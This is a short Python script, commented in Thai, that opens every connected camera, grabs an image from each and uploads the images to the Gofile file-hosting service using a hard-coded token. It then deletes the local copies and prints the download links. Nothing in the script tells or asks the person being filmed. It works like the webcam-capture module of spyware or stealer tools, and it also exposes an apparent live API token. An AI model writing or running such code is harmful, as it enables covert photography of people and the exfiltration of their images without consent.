import cv2
import requests
import os
import shutil

api_url = "https://store1.gofile.io/contents/uploadfile"
auth_token = "mLEJ5Fs9282pWwzqetxZpwd3f3Z0NdAB"  # ใส่โทเค็นของคุณที่นี่

def upload_file(file_path):
    """อัปโหลดไฟล์ไปยัง Gofile API"""
    with open(file_path, 'rb') as file:
        files = {"file": file}
        headers = {"Authorization": f"Bearer {auth_token}"}
        
        response = requests.post(api_url, files=files, headers=headers)
        
        if response.status_code == 200:
            try:
                return response.json()
            except requests.exceptions.JSONDecodeError:
                print(f"Error decoding JSON response: {response.text}")
        else:
            print(f"Error: {response.status_code} - {response.text}")
        return None

def capture_images(num_images=1, temp_path="temp"):
    """จับภาพจากกล้องและอัปโหลดไปยัง Gofile"""
    num_cameras = 0
    cameras = []

    # สร้างโฟลเดอร์สำหรับเก็บภาพ
    webcam_folder = os.path.join(temp_path)
    os.makedirs(webcam_folder, exist_ok=True)

    # ค้นหากล้องทั้งหมดที่เชื่อมต่อ
    while True:
        cap = cv2.VideoCapture(num_cameras)
        if not cap.isOpened():
            break
        cameras.append(cap)
        num_cameras += 1

    if num_cameras == 0:
        print("No cameras found.")
        return

    file_paths = []

    # จับภาพจากกล้องทั้งหมด
    for _ in range(num_images):
        for i, cap in enumerate(cameras):
            ret, frame = cap.read()
            if ret:
                file_path = os.path.join(webcam_folder, f"image_from_camera_{i}.jpg")
                cv2.imwrite(file_path, frame)
                file_paths.append(file_path)

    # ปล่อยกล้อง
    for cap in cameras:
        cap.release()

    # อัปโหลดไฟล์ที่บันทึกทั้งหมด
    for file_path in file_paths:
        response = upload_file(file_path)
        if response:
            data2 = response.get('data', {}).get('downloadPage', 'No download page')
            print(f"File {file_path} uploaded. Download page: {data2}")
        else:
            print(f"Failed to upload file: {file_path}")

    shutil.rmtree(webcam_folder)

# เรียกใช้งานฟังก์ชัน
capture_images(num_images=1)
